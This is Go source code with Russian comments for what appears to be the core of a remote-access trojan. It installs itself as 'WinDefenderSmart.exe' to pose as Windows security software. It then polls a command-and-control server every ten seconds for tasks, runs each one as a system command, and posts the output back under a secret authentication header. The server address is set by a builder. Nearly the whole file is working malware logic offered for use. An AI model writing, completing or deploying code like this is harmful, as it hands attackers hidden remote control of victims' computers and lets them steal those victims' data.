package main

import (
	"io"
	"net/http"
	"strings"
	"time"
)

// Переменные инжектятся через билдер (ldflags)
var (
	ServerURL  = "127.0.0.1:8080"
	SecretCode = "DEFAULT_CODE"
	ExeName    = "WinDefenderSmart.exe"
)

func main() {
	// Установка в систему под нужным именем
	Install(ExeName)

	client := &http.Client{Timeout: 30 * time.Second}

	for {
		// Опрос сервера
		req, err := http.NewRequest("GET", "http://"+ServerURL+"/get_task", nil)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		req.Header.Set("X-Secret-Auth", SecretCode)

		resp, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			task := strings.TrimSpace(string(body))
			resp.Body.Close()

			if task != "" && task != "none" {
				// Выполнение команды через мост в commands.go
				result := ExecuteSystemCommand(task)

				// Отправка результата
				sendResult(client, result)
			}
		}
		time.Sleep(10 * time.Second)
	}
}

func sendResult(client *http.Client, result string) {
	url := "http://" + ServerURL + "/send_result"
	resReq, err := http.NewRequest("POST", url, strings.NewReader(result))
	if err == nil {
		resReq.Header.Set("X-Secret-Auth", SecretCode)
		resReq.Header.Set("Content-Type", "text/plain; charset=utf-8")
		if resp, err := client.Do(resReq); err == nil {
			resp.Body.Close()
		}
	}
}
